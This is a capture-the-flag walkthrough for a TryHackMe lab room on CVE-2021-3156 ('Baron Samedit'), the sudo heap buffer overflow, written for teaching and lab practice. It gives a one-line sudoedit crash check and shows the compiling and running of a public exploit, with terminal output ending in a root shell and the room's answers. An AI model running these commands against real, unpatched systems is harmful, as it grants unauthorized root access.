# Baron Samedit

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Walkthrough
Difficulty: Info
Tags: Linux
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
Subscription type: Free
Description: 
A tutorial room exploring CVE-2021-3156 in the Unix Sudo Program. Room Three in the SudoVulns Series
```

Room link: [https://tryhackme.com/room/sudovulnssamedit](https://tryhackme.com/room/sudovulnssamedit)

## Solution

### Task 1: Deploy

Click the green "**Start Machine**" button to start an instance of the machine!

Once it loads, this machine can be accessed in the browser window at the top of the screen. If you would prefer to access the box manually then you can connect to it through the TryHackMe network using the AttackBox or your OpenVPN configuration file. If you don't know how to do this, take a quick look at the [OpenVPN room](https://tryhackme.com/room/openvpn) first.

(Please note that VMs can take a few minutes to boot up fully)

Credit for the header image goes to the amazing [@Vargnaar](https://twitter.com/Vargnaar)

---------------------------------------------------------------------------------------

Use the machine in your browser, or login over SSH using these credentials:

- **Username**: `tryhackme`
- **Password**: `tryhackme`

The command will be:

`ssh tryhackme@10.64.129.144`

Note: if the above command does not display an IP address then you haven't booted the machine, or haven't given it time to load.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Info/Baron_Samedit]
└─$ ssh tryhackme@10.64.129.144
The authenticity of host '10.64.129.144 (10.64.129.144)' can't be established.
ED25519 key fingerprint is SHA256:OdPmKbN+EkdmN1JGMria9Ywo9R1IJDKLXYyHJHOIc3g.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.64.129.144' (ED25519) to the list of known hosts.
tryhackme@10.64.129.144's password: 


         _____           _   _            _    __  __      
        |_   _| __ _   _| | | | __ _  ___| | _|  \/  | ___ 
          | || '__| | | | |_| |/ _` |/ __| |/ / |\/| |/ _ \
          | || |  | |_| |  _  | (_| | (__|   <| |  | |  __/
          |_||_|   \__, |_| |_|\__,_|\___|_|\_\_|  |_|\___|
                   |___/                                   


tryhackme@CVE-2021-3156:~$ 
```

### Task 2: Buffer Overflow

In January 2021, [Qualys](https://qualys.com/) released a [blog post](https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit) detailing a terrifying new vulnerability in the Unix sudo program.

Specifically, this was a heap buffer overflow allowing any user to escalate privileges to root -- no misconfigurations required. This exploit works with the default settings, for any user regardless of sudo permissions, which makes it all the scarier. The vulnerability has been patched, but affects any unpatched version of the sudo program from 1.8.2-1.8.31p2 and 1.9.0-1.9.5p1, meaning that it's been around for the last ten years.

The program was very quickly patched (with patched versions making their way into repositories soon after), so this exploit will no longer work on up-to-date targets; however, it is still incredibly powerful.

As with **CVE-2019-18634** (which we saw in the [second sudovulns room](https://tryhackme.com/room/sudovulnsbof)), this vulnerability is a buffer overflow in the sudo program; however, this time the vulnerability is a heap buffer overflow, as opposed to the stack buffer overflow we saw before. The stack is a very regimented section of memory which stores various important aspects of a program. The heap, on the other hand, is reserved for dynamic allocation of memory, allowing for more flexibility in how values and constructs are created and accessed by a program. As with the previous room, we will not go into a huge amount of detail about how this works in the interests of keeping the content beginner friendly. All we really need to understand is that this vulnerability is incredibly powerful, and extremely wide-reaching.

---------------------------------------------------------------------------------------

So, first up, what can we do to check whether a system is vulnerable?

Fortunately there is a very easy method we can use to check; simply enter this command into a terminal:

`sudoedit -s '\' $(python3 -c 'print("A"*1000)')`

If the system is vulnerable then this will overwrite the heap buffer and crash the program:

![CVE-2021-3156 Exploit 1](Images/CVE-2021-3156_Exploit_1.png)

This PoC was obtained from a researcher named [lockedbyte](https://twitter.com/lockedbyte), [here](https://github.com/lockedbyte/CVE-Exploits/tree/master/CVE-2021-3156).

```bash
tryhackme@CVE-2021-3156:~$ sudoedit -s '\' $(python3 -c 'print("A"*1000)')
malloc(): memory corruption
Aborted (core dumped)
tryhackme@CVE-2021-3156:~$ 
```

---------------------------------------------------------------------------------------

When the advisory first came out, Qualys did not supply full code for the exploit. It did not take long for other researchers to replicate the vulnerability; however. The first working copy of the exploit to be made publicly available was created by a researcher known as [bl4sty](https://twitter.com/bl4sty). Their full exploit code can be found on Github, [here](https://github.com/blasty/CVE-2021-3156). This is what we will be using to exploit the machine you deployed in the first task.

This machine has been setup to allow for easy exploitation of the vulnerability. As such, the Github repository linked above has already been added to the target.

In the home directory you will see a folder called "**Exploit**":

![CVE-2021-3156 Exploit 2](Images/CVE-2021-3156_Exploit_2.png)

Enter this directory (`cd Exploit`) -- you will see a file called "Makefile". This indicates that we can automatically compile the exploit simply by typing `make` and pressing enter:

![CVE-2021-3156 Exploit 3](Images/CVE-2021-3156_Exploit_3.png)

When we run this file we will be presented with several options:

![CVE-2021-3156 Exploit 4](Images/CVE-2021-3156_Exploit_4.png)

**Note**: the name of the executable has been changed here as it is the answer to Question 1.

There are currently three targets which this exploit will work against. The machine we deployed is an Ubuntu 18.04.5 server, so we will use target 0.

When executed with the target specified as a parameter, we gain a root shell!

![CVE-2021-3156 Exploit 5](Images/CVE-2021-3156_Exploit_5.png)

---------------------------------------------------------------------------------------

#### After compiling the exploit, what is the name of the executable created (blurred in the screenshots above)?

```bash
tryhackme@CVE-2021-3156:~$ ls -l
total 4
drwxrwxr-x 3 tryhackme tryhackme 4096 Jan 31  2021 Exploit
tryhackme@CVE-2021-3156:~$ cd Exploit/
tryhackme@CVE-2021-3156:~/Exploit$ ls -l
total 16
-rw-rw-r-- 1 tryhackme tryhackme 3611 Jan 31  2021 hax.c
-rw-rw-r-- 1 tryhackme tryhackme  386 Jan 31  2021 lib.c
-rw-rw-r-- 1 tryhackme tryhackme  179 Jan 31  2021 Makefile
-rw-rw-r-- 1 tryhackme tryhackme  694 Jan 31  2021 README.md
tryhackme@CVE-2021-3156:~/Exploit$ make
rm -rf libnss_X
mkdir libnss_X
gcc -o sudo-hax-me-a-sandwich hax.c
gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
tryhackme@CVE-2021-3156:~/Exploit$ ls -l
total 36
-rw-rw-r-- 1 tryhackme tryhackme  3611 Jan 31  2021 hax.c
-rw-rw-r-- 1 tryhackme tryhackme   386 Jan 31  2021 lib.c
drwxr-xr-x 2 tryhackme tryhackme  4096 Feb  4 17:25 libnss_X
-rw-rw-r-- 1 tryhackme tryhackme   179 Jan 31  2021 Makefile
-rw-rw-r-- 1 tryhackme tryhackme   694 Jan 31  2021 README.md
-rwxr-xr-x 1 tryhackme tryhackme 12968 Feb  4 17:25 sudo-hax-me-a-sandwich
tryhackme@CVE-2021-3156:~/Exploit$ 
```

Answer: `sudo-hax-me-a-sandwich`

#### What is the flag in /root/flag.txt?

```bash
tryhackme@CVE-2021-3156:~/Exploit$ ./sudo-hax-me-a-sandwich

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

  usage: ./sudo-hax-me-a-sandwich <target>

  available targets:
  ------------------------------------------------------------
    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
  ------------------------------------------------------------

tryhackme@CVE-2021-3156:~/Exploit$ cat /etc/os-release 
NAME="Ubuntu"
VERSION="18.04 LTS (Bionic Beaver)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 18.04 LTS"
VERSION_ID="18.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=bionic
UBUNTU_CODENAME=bionic
tryhackme@CVE-2021-3156:~/Exploit$ ./sudo-hax-me-a-sandwich 0

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

using target: 'Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27'
** pray for your rootshell.. **
[+] bl1ng bl1ng! We got it!
# id
uid=0(root) gid=0(root) groups=0(root),1000(tryhackme)
# cat /root/flag.txt
THM{<REDACTED>}
# 
```

Answer: `THM{<REDACTED>}`

For additional information, please see the references below.

## References

- [CVE-2021-3156 - NIST](https://nvd.nist.gov/vuln/detail/cve-2021-3156)
- [CVE-2021-3156 PoC - blasty - GitHub](https://github.com/blasty/CVE-2021-3156)
- [CVE-2021-3156 PoC - lockedbyte - GitHub](https://github.com/lockedbyte/CVE-Exploits/tree/master/CVE-2021-3156)
- [id - Linux manual page](https://man7.org/linux/man-pages/man1/id.1.html)
- [Secure Shell - Wikipedia](https://en.wikipedia.org/wiki/Secure_Shell)
- [ssh - Linux manual page](https://man7.org/linux/man-pages/man1/ssh.1.html)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
- [sudoedit - Linux manual page](https://www.man7.org/linux/man-pages/man8/sudoedit.8.html)
- [sudoers - Linux manual page](https://man7.org/linux/man-pages/man5/sudoers.5.html)
